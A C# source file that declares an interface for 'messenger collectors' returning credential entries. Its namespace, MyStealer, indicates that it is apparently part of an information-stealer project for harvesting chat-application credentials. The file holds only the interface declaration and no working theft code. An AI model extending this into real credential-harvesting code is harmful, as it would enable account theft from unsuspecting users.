using System.Collections.Immutable;

namespace MyStealer.Collectors.Messenger
{
    internal interface IMessengerCollector
    {
        IImmutableSet<CredentialEntry> GetCredentials();
    }
}
